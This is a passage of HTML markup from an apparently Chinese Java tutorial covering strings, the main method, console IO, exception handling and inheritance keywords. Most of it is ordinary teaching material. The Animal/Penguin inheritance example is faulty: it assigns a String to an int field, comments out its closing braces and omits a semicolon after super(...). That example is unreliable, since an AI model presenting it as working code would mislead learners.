punctuation\">;</span>\n         System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span>\n   <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"String类\"><a href=\"#String类\" class=\"headerlink\" title=\"String类\"></a>String类</h2><p>java的String类一般定义后不再改变（字符串），要频繁修改，使用StringBuffer 和 StringBuilder 类</p>\n<p>java的字符数组可以直接用new String()方式转换成字符串。</p>\n<h2 id=\"Java-StringBuffer-和-StringBuilder-类\"><a href=\"#Java-StringBuffer-和-StringBuilder-类\" class=\"headerlink\" title=\"Java StringBuffer 和 StringBuilder 类\"></a>Java StringBuffer 和 StringBuilder 类</h2><p>当对字符串进行修改的时候，需要使用 StringBuffer 和 StringBuilder 类。</p>\n<p>和 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。</p>\n<p>StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。</p>\n<p>由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。</p>\n<h2 id=\"JAVA的Main函数\"><a href=\"#JAVA的Main函数\" class=\"headerlink\" title=\"JAVA的Main函数\"></a>JAVA的Main函数</h2><h3 id=\"public-static-void-main-String-args\"><a href=\"#public-static-void-main-String-args\" class=\"headerlink\" title=\"public static void main(String[] args)\"></a>public static void main(String[] args)</h3><p>如果要调用其他类的main函数，只要像调用它的公有方法一样就行，但要记得必须带上一个String字符串参数（new []String{}）。</p>\n<p>另，由于main函数是静态方法，所以调用时并不需要对象实例。</p>\n<p>例：</p>\n<p>Test.java</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token comment\" spellcheck=\"true\">//        int x=10;</span>\n        <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> str<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">:</span>str<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"这个数现在为：\"</span><span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>TestTest.java</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TestTest</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token comment\" spellcheck=\"true\">//        Test test=new Test();</span>\n        Test<span class=\"token punctuation\">.</span><span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>运行结果：</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">D:\\JDK\\8\\bin\\java.exe TestTest\n这个数现在为：1\n这个数现在为：2\n这个数现在为：3\n这个数现在为：4\n这个数现在为：5<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ol>\n<li><h4 id=\"public\"><a href=\"#public\" class=\"headerlink\" title=\"public\"></a>public</h4><p>访问修饰符，public表示可访问权限最高。</p>\n</li>\n<li><h4 id=\"static\"><a href=\"#static\" class=\"headerlink\" title=\"static\"></a>static</h4><p>static关键字是重点。<br>static关键字用来修饰静态成员变量或者方法。</p>\n<p>通俗的说，static表示其修饰的成员变量或方法不需要实例化类就可以使用。也就是说，static变量不依赖于类的任何实例，只要类被加载(加载不等于实例化)，jvm（java虚拟机）就可以直接找到他们而不需要创建关于类的任何对象。<br>static关键字前可以有修饰符进行修饰，当使用public static时，其实相当于创建了一个<strong>全局变量(方法)</strong>。<br>再来看static修饰的代码块(即为static {…}形式的)，也叫做静态代码块。概念不必多讲，静态代码块有一个非常重要的特点：</p>\n<p><strong>随着类的加载而执行且只执行一次</strong>。<br>静态代码块可以有多个，位置可以随便放，它不在任何的方法体内，jvm加载类时会优先执行这些静态的代码块，如果static代码块有多个，jvm将按照它们在类中出现的先后顺序依次执行它们，每个代码块只会被执行一次。</p>\n<p>那么main函数前加public static的意义是什么呢？意义就是这样的话，在当前类还未实例化的时候，可以运行main函数。</p>\n</li>\n<li><h4 id=\"void\"><a href=\"#void\" class=\"headerlink\" title=\"void\"></a>void</h4><p>与C系语言不同的是，java语言默认都是正常状态结束。也就是System.exit(0)，异常结束是1。所以，java的主方法没有必要存在返回值，即void。</p>\n</li>\n<li><h4 id=\"main\"><a href=\"#main\" class=\"headerlink\" title=\"main\"></a>main</h4><p>沿袭C系列main命名的主函数。</p>\n</li>\n<li><h4 id=\"String\"><a href=\"#String\" class=\"headerlink\" title=\"String[]\"></a>String[]</h4><p>使用命令行运行class文件的时候是可以附加参数的，懂得都懂，比如 Terminal&gt;java HelloWorld test  这种写法。test会作为参数传入mian方法。因为参数并不仅限一个，所以定义成数组格式。</p>\n<p>但在IDE中运行Java程序还是必须得在main函数中加上String[] args，否则main函数无法运行。</p>\n<p><strong>用String数组得原因：</strong><br>String作为java中最万能的包装类具有普遍性。天地万物都可以解释成String，String也可以解析成天地万物，所以用String来存放参数自然是最优选择。<br>ps.在java 1.5以后，String[]完全可以写成String…(不定项参数)，不妨试一下。</p>\n</li>\n<li><h4 id=\"args\"><a href=\"#args\" class=\"headerlink\" title=\"args\"></a>args</h4><p>计算机领域用来表示参数的变量名其实就那么几个，params，args算是约定俗成的了。其实完全可以叫abc，这个想怎么叫就怎么叫。</p>\n</li>\n</ol>\n<h2 id=\"Java-流-Stream-、文件-File-和IO\"><a href=\"#Java-流-Stream-、文件-File-和IO\" class=\"headerlink\" title=\"Java 流(Stream)、文件(File)和IO\"></a>Java 流(Stream)、文件(File)和IO</h2><p>Java.io 包几乎包含了所有操作输入、输出需要的类。所有这些流类代表了输入源和输出目标。</p>\n<p>Java.io 包中的流支持很多种格式，比如：基本类型、对象、本地化字符集等等。</p>\n<p>一个流可以理解为一个数据的序列。输入流表示从一个源读取数据，输出流表示向一个目标写数据。</p>\n<h3 id=\"读取控制台输入\"><a href=\"#读取控制台输入\" class=\"headerlink\" title=\"读取控制台输入\"></a>读取控制台输入</h3><p>Java 的控制台输入由 System.in 完成。</p>\n<p>为了获得一个绑定到控制台的字符流，需要把 System.in 包装在一个 BufferedReader 对象中来创建一个字符流。</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\">BufferedReader br <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> \n                      <span class=\"token class-name\">InputStreamReader</span><span class=\"token punctuation\">(</span>System<span class=\"token punctuation\">.</span>in<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><strong>BufferedReader</strong> 对象创建后，便可以使用 <strong>read()</strong> 方法从控制台读取一个字符，或者用 <strong>readLine()</strong> 方法读取一个字符串。</p>\n<h3 id=\"控制台输出\"><a href=\"#控制台输出\" class=\"headerlink\" title=\"控制台输出\"></a>控制台输出</h3><p>控制台的输出由 print( ) 和 println() 完成，这些方法都由类 PrintStream 定义，System.out 是该类对象的一个引用。</p>\n<p>PrintStream 继承了 OutputStream类，并且实现了方法 write()。这样，write() 也可以用来往控制台写操作。</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token comment\" spellcheck=\"true\">//用 write() 把字符 \"A\" 和紧跟着的换行符输出到屏幕</span>\n<span class=\"token keyword\">import</span> java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span>*<span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\" spellcheck=\"true\">//演示 System.out.write().</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">WriteDemo</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String args<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">;</span>        <span class=\"token comment\" spellcheck=\"true\">//用char也行</span>\n        b <span class=\"token operator\">=</span> <span class=\"token string\">'A'</span><span class=\"token punctuation\">;</span>\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>write() 方法不经常使用，因为 print() 和 println() 方法用起来更为方便。</p>\n<h3 id=\"读写文件\"><a href=\"#读写文件\" class=\"headerlink\" title=\"读写文件\"></a>读写文件</h3><p>下图是一个描述输入流和输出流的类层次图。</p>\n<p><img src=\"/img/iostream2xx.png\" alt=\"img\"></p>\n<h2 id=\"Java-异常处理\"><a href=\"#Java-异常处理\" class=\"headerlink\" title=\"Java 异常处理\"></a>Java 异常处理</h2><p>异常是程序中的一些错误，但并不是所有的错误都是异常，并且错误有时候是可以避免的。</p>\n<p>比如说，你的代码少了一个分号，那么运行出来结果是提示是错误 java.lang.Error；如果你用System.out.println(11/0)，那么你是因为你用0做了除数，会抛出 java.lang.ArithmeticException 的异常。</p>\n<p>异常发生的原因有很多，通常包含以下几大类：</p>\n<ul>\n<li>用户输入了非法数据。</li>\n<li>要打开的文件不存在。</li>\n<li>网络通信时连接中断，或者JVM内存溢出。</li>\n</ul>\n<p>这些异常有的是因为用户错误引起，有的是程序错误引起的，还有其它一些是因为物理错误引起的。-</p>\n<p>要理解Java异常处理是如何工作的，你需要掌握以下三种类型的异常：</p>\n<ul>\n<li><strong>检查性异常：</strong>最具代表的检查性异常是用户错误或问题引起的异常，这是程序员无法预见的。例如要打开一个不存在文件时，一个异常就发生了，这些异常在编译时不能被简单地忽略。</li>\n<li><strong>运行时异常：</strong> 运行时异常是可能被程序员避免的异常。与检查性异常相反，运行时异常可以在编译时被忽略。</li>\n<li><strong>错误：</strong> 错误不是异常，而是脱离程序员控制的问题。错误在代码中通常被忽略。例如，当栈溢出时，一个错误就发生了，它们在编译也检查不到的。</li>\n</ul>\n<p>异常类有两个主要的子类：IOException 类和 RuntimeException 类。</p>\n<p><img src=\"/img/12-130Q1234I6223.jpg\" alt=\"img\"></p>\n<h3 id=\"捕获异常\"><a href=\"#捕获异常\" class=\"headerlink\" title=\"捕获异常\"></a>捕获异常</h3><p>使用 try 和 catch 关键字可以捕获异常。try/catch 代码块放在异常可能发生的地方。</p>\n<p>try/catch代码块中的代码称为保护代码，使用 try/catch 的语法如下：</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">try</span>\n<span class=\"token punctuation\">{</span>\n   <span class=\"token comment\" spellcheck=\"true\">// 程序代码</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>ExceptionName e1<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n   <span class=\"token comment\" spellcheck=\"true\">//Catch 块</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>Catch 语句包含要捕获异常类型的声明。当保护代码块中发生一个异常时，try 后面的 catch 块就会被检查。</p>\n<p>如果发生的异常包含在 catch 块中，异常会被传递到该 catch 块，这和传递一个参数到方法是一样。</p>\n<h3 id=\"多重捕获块\"><a href=\"#多重捕获块\" class=\"headerlink\" title=\"多重捕获块\"></a>多重捕获块</h3><p>一个 try 代码块后面跟随多个 catch 代码块的情况就叫多重捕获。</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n   <span class=\"token comment\" spellcheck=\"true\">// 程序代码</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>异常类型<span class=\"token number\">1</span> 异常的变量名<span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\" spellcheck=\"true\">// 程序代码</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>异常类型<span class=\"token number\">2</span> 异常的变量名<span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\" spellcheck=\"true\">// 程序代码</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>异常类型<span class=\"token number\">3</span> 异常的变量名<span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\" spellcheck=\"true\">// 程序代码</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>上面的代码段包含了 3 个 catch块。</p>\n<p>可以在 try 语句后面添加任意数量的 catch 块。</p>\n<p>如果保护代码中发生异常，异常被抛给第一个 catch 块。</p>\n<p>如果抛出异常的数据类型与 ExceptionType1 匹配，它在这里就会被捕获。</p>\n<p>如果不匹配，它会被传递给第二个 catch 块。</p>\n<p>如此，直到异常被捕获或者通过所有的 catch 块。</p>\n<h3 id=\"throws-throw-关键字：\"><a href=\"#throws-throw-关键字：\" class=\"headerlink\" title=\"throws/throw 关键字：\"></a>throws/throw 关键字：</h3><p>如果一个方法没有捕获到一个检查性异常，那么该方法必须使用 throws 关键字来声明。throws 关键字放在方法签名的尾部。</p>\n<p>也可以使用 throw 关键字抛出一个异常，无论它是新实例化的还是刚捕获到的。</p>\n<p>下面方法的声明抛出一个 RemoteException 异常：</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">import</span> java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span>*<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">className</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">double</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> RemoteException\n  <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\" spellcheck=\"true\">// Method implementation</span>\n    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RemoteException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token comment\" spellcheck=\"true\">//Remainder of class definition</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>一个方法可以声明抛出多个异常，多个异常之间用逗号隔开。</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">import</span> java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span>*<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">className</span>\n<span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">double</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> RemoteException<span class=\"token punctuation\">,</span>\n                              InsufficientFundsException\n   <span class=\"token punctuation\">{</span>\n       <span class=\"token comment\" spellcheck=\"true\">// Method implementation</span>\n   <span class=\"token punctuation\">}</span>\n   <span class=\"token comment\" spellcheck=\"true\">//Remainder of class definition</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"finally关键字\"><a href=\"#finally关键字\" class=\"headerlink\" title=\"finally关键字\"></a>finally关键字</h3><p>finally 关键字用来创建在 try 代码块后面执行的代码块。</p>\n<p>无论是否发生异常，finally 代码块中的代码总会被执行。</p>\n<p>在 finally 代码块中，可以运行清理类型等收尾善后性质的语句。</p>\n<p>finally 代码块出现在 catch 代码块最后，语法如下：</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\" spellcheck=\"true\">// 程序代码</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>异常类型<span class=\"token number\">1</span> 异常的变量名<span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\" spellcheck=\"true\">// 程序代码</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>异常类型<span class=\"token number\">2</span> 异常的变量名<span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\" spellcheck=\"true\">// 程序代码</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">finally</span><span class=\"token punctuation\">{</span>\n  <span class=\"token comment\" spellcheck=\"true\">// 程序代码</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><strong>注意事项：</strong></p>\n<ul>\n<li>catch 不能独立于 try 存在。</li>\n<li>在 try/catch 后面添加 finally 块并非强制性要求的。</li>\n<li>try 代码后不能既没 catch 块也没 finally 块。</li>\n<li>try, catch, finally 块之间不能添加任何代码。</li>\n</ul>\n<h2 id=\"JAVA继承\"><a href=\"#JAVA继承\" class=\"headerlink\" title=\"JAVA继承\"></a>JAVA继承</h2><p>java的继承和C语言差不多，除了java的类不能多继承，但类可以多继承接口。</p>\n<h2 id=\"继承关键字\"><a href=\"#继承关键字\" class=\"headerlink\" title=\"继承关键字\"></a>继承关键字</h2><p>继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承object（这个类在 <strong>java.lang</strong> 包中，所以不需要 <strong>import</strong>）祖先类。</p>\n<h3 id=\"extends关键字\"><a href=\"#extends关键字\" class=\"headerlink\" title=\"extends关键字\"></a>extends关键字</h3><p>在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Animal</span> <span class=\"token punctuation\">{</span> \n    <span class=\"token keyword\">private</span> String name<span class=\"token punctuation\">;</span>   \n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> id<span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token function\">Animal</span><span class=\"token punctuation\">(</span>String myName<span class=\"token punctuation\">,</span> String myId<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> \n        name<span class=\"token operator\">=</span> myName<span class=\"token punctuation\">;</span>\n        id<span class=\"token operator\">=</span> myId<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\" spellcheck=\"true\">//初始化属性值的具体实现</span>\n    <span class=\"token punctuation\">}</span> \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>  <span class=\"token comment\" spellcheck=\"true\">//吃东西方法的具体实现  } </span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\" spellcheck=\"true\">//睡觉方法的具体实现  } </span>\n<span class=\"token punctuation\">}</span> \n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Penguin</span>  <span class=\"token keyword\">extends</span>  <span class=\"token class-name\">Animal</span><span class=\"token punctuation\">{</span> \n    <span class=\"token keyword\">public</span> <span class=\"token function\">Penguin</span><span class=\"token punctuation\">(</span>String myName<span class=\"token punctuation\">,</span>String myId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>myName<span class=\"token punctuation\">,</span> myId<span class=\"token punctuation\">)</span>        <span class=\"token comment\" spellcheck=\"true\">//直接调用父类构造方法</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"implements关键字\"><a href=\"#implements关键字\" class=\"headerlink\" title=\"implements关键字\"></a>implements关键字</h3><p>使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">A</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">B</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">C</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">,</span>B <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"super-与-this-关键字\"><a href=\"#super-与-this-关键字\" class=\"headerlink\" title=\"super 与 this 关键字\"></a>super 与 this 关键字</h3><p><strong>super</strong>关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。</p>\n<p><strong>super()</strong>函数：可以用于调用直接父类构造函数。</p>\n<p>如果父类构造函数没有参数，则在子类的构造器中不需要使用 <strong>super</strong> 关键字调用父类构造器，系统会自动调用父类的无参构造函数。</p>\n<p><strong>this</strong>关键字：指向本类的引用。</p>\n<p><strong>PS：</strong>使用super调用父类函数中有this关键字时，this指向的不是本类（子类）的引用，不会改变本类的成员变量，也就是不会改变本类的状态。</p>\n<p><strong>实例</strong></p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Animal</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">void</span> <span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"animal : eat\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Dog</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Animal</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">void</span> <span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dog : eat\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">void</span> <span class=\"token function\">eatTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\" spellcheck=\"true\">// this 调用自己的方法</span>\n    <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\" spellcheck=\"true\">// super 调用父类方法</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    Animal a <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Animal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    a<span class=\"token punctuation\">.</span><span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    Dog d <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Dog</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    d<span class=\"token punctuation\">.</span><span class=\"token function\">eatTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 